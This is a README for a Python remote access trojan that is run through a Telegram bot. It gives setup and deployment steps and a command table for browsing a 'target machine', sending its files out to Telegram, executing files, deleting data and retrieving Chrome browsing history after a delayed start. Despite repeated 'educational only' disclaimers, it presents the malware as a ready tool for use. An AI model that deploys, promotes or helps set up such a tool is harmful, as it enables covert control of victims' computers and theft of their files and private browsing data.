RAT Downloader

RAT Downloader is a Python-based tool for educational purposes only.
It lets you interact remotely with files on a target machine via Telegram.

⚠️ WARNING: This tool is for educational and authorized testing only.
Do not use on systems without permission. Misuse is your responsibility.

🛠 Features

Browse directories

Download and upload files

Execute commands remotely

View Chrome browser history

📦 Requirements

System Requirements:

Python 3.8+

Internet connection

Telegram bot token

Telegram chat ID

Python Dependencies:

pip install -r requirements.txt


requirements.txt should include:

requests


Configuration (config.py):

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/"

🗂 File Structure
File	Description
main.py	Main bot script
config.py	Telegram bot configuration
requirements.txt	Python dependencies
🚀 Usage

Clone repository:

git clone https://github.com/cmdkill3r/RAT-Downloader.git
cd RAT-Downloader


Install dependencies:

pip install -r requirements.txt


Configure your bot in config.py.

Run the bot:

python main.py


After ~5 minutes boot delay, the bot will start.
Interact via Telegram commands.

📜 Commands
Command	Description
pwd	Show current directory
ls	List files and folders
cd <dir>	Change directory
upload <file>	Upload file to Telegram
send <file>	Alias of upload
cp <src> <dst>	Copy file
mv <src> <dst>	Move or rename file
rm <file>	Delete file
mkdir <folder>	Create folder
run/exec <file>	Execute file
cat <file>	Show first 4k characters of a file
head <file> [n]	Show first n lines
tail <file> [n]	Show last n lines
history chrome	Retrieve last 12h of Chrome history
exit	Shut down bot
⚖️ Legal & Educational Notice

This tool is strictly educational. Using it on computers without explicit permission is illegal.
You are fully responsible for your actions.

📝 License

MIT License (2025) — cmdkill3r

Permission is hereby granted, free of charge, to any person obtaining a copy...
[Full license text here]

👤 Author

GitHub: cmdkill3r

Purpose: Educational only
